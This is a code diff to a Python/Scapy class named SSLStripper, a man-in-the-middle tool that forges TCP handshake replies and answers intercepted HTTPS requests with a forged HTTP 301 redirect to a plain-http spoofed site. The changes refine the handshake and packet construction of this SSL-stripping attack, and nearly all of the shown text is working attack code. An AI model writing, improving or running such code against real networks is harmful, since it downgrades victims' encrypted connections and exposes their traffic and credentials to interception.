@@ -33,38 +33,36 @@ class SSLStripper:
             log_warning("Ignoring packet from {} because it is not intended for us but for {}".format(packet[IP].src, packet[IP].dst))
             return
         
-        # Check if we have a SYN packet such that we can complete the handshake.
-        if packet[TCP].flags == 0x02:
+        # Check if we have a SYN packet to start the handshake.
+        if packet.haslayer(TCP) and packet[TCP].flags == 0x02:  # SYN
             log_info("Received SYN packet from {}".format(packet[IP].src))
+            
             # Construct the SYN-ACK packet
-            response = (
-                IP(dst=packet[IP].src, src=packet[IP].dst)
-                / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="SA", seq=packet[TCP].ack, ack=packet[TCP].seq + 1)
-            )
-
+            response = (IP(dst=packet[IP].src, src=packet[IP].dst) /
+                        TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="SA", 
+                            seq=1001, ack=packet[TCP].seq + 1))
+            
             send(response, verbose=0)
             log_info("Sent SYN-ACK packet to {}".format(packet[IP].src))
 
-        # Ignore ACK packets, as the handshake has completed.
-        elif packet[TCP].flags == 0x10:
+        # Check if we have an ACK packet to complete the handshake.
+        elif packet.haslayer(TCP) and packet[TCP].flags == 0x10:  # ACK
             log_info("Received ACK packet from {}".format(packet[IP].src))
+            # Handshake is complete; next packet should be SSL Client Hello or similar.
 
-        # SSL stripping
-        else:
-            log_info(
-                "Received HTTPS request for {} from {}".format(
-                    packet[IP].dst, packet[IP].src
-                )
-            )
-            # Construct the HTTP response
-            response = (
-                IP(dst=packet[IP].src, src=packet[IP].dst)
-                / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].ack, ack=packet[TCP].seq + 1)
-                / Raw(load="HTTP/1.1 301 Moved Permanently\nLocation: http://{}".format(self.site_to_spoof))
-            )
+        # Check if it's an HTTPS request (Client Hello packet or other)
+        elif packet.haslayer(TCP) and len(packet[TCP].payload) > 0:
+            log_info("Received HTTPS request for {} from {}".format(packet[IP].dst,packet[IP].src))
 
+            # Construct the HTTP 301 Moved Permanently response
+            response = (IP(dst=packet[IP].src, src=packet[IP].dst) /
+                        TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="FA",
+                            seq=packet[TCP].ack, ack=packet[TCP].seq + len(packet[TCP].payload)) /
+                        Raw(load="HTTP/1.1 301 Moved Permanently\r\n"
+                                 "Location: http://{}\r\n\r\n".format(self.site_to_spoof)))
+            
             send(response, verbose=0)
-            log_info("Sent HTTP response for {} to {}".format(packet[IP].src, packet[IP].dst))
+            log_info("Sent HTTP response to {}".format(packet[IP].src))
 
 def add_iptables_rule(port):
     # Add the iptables rule to drop incoming packets for the specified port
